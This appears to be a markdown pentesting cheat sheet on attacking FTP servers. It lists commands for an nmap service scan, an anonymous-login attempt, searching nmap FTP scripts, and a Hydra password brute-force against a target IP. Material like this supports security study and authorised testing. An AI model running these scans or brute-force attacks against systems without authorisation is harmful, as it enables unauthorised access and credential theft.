# Exploiting FTP
> FTP is File Transfer Protocol. It uses TCP port 21. FTP is used to facilitate file sharing between a server and its clients. FTP is also frequently used as a means of transferring files to and from the directory of a web server.

## Contents
- [Intro](#)
- [Exploit: Brute Force](#)
  - [Nmap: Scan the Target](#)
  - [Connect to the FTP Server](#)
  - [NSE: FTP Scripts](#)
  - [Hydra: Brute-Force Attack](#)
  - [Login](#)
 
## Intro

- FTP authentication requires a username and password combo.
- Possible Misconfiguration Vulnerability: Anonymous login 
- Most often, unless you find an vulnerable FTP server, you're pretty much left with brute-forcing a password.


## Exploit: Brute Force

### Nmap: Scan the Target
- Start with a scan of the target system:
```
nmap -sS -sV -sC -O -p- [target ip]
# of if you know port 21 is open, scan it only
```

### Connect to the FTP Server
```
ftp [target ip]
```
- When prompted for the username: anonymous
- When prompted for the password: ENTER
- If it fails then anonymous logins are not allowed.

### NSE: FTP Scripts
- Find an nmap script for ftp:
```
ls -l /usr/share/nmap/scripts | grep ftp-*
```
- The `ftp-anon` script will check for anonymous logins. 

### [Hydra](../../hydra.md): Brute-Force Attack
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/.../unix_passwords.txt [ip] -t 4 ftp
```
- `-L` login names to use
- `-P` passwords to use
- `-t` threads, lower to avoid DoSing the target

### Login
- If Hydra gave you some results, try to login to the target system.
